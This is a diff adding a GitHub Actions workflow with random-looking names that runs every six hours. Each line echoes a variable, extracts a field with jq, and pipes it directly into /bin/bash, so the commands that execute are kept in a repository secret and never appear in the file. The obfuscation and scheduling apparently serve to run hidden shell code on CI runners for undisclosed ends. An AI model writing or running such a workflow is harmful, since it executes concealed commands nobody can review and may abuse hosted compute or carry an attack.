@@ -1,0 +1,28 @@
+name: gangcaishizaichii
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: gangcaishizaichii
+        env:
+          rqmxl7: ${{ secrets.rqmxl7 }}
+        run: |
+          echo $rqmxl7 | jq -r .v167 | /bin/bash
+          echo $tb34771 | jq -r .q2604 | /bin/bash
+          echo $rq08 | jq -r .lq2820 | /bin/bash
+          echo $tcwr3 | jq -r .dl7786 | /bin/bash
+          echo $aygqh19006 | jq -r .znvuu95955 | /bin/bash
+          echo $iceaw69 | jq -r .sd7 | /bin/bash
+          echo $fxk96 | jq -r .phlrs987 | /bin/bash
+          echo $h6 | jq -r .neqr350 | /bin/bash
+          echo $lujh157 | jq -r .sb336 | /bin/bash
+          echo $lljjr6 | jq -r .abqqa9440 | /bin/bash
+          echo $tw335 | jq -r .taspq022 | /bin/bash
+
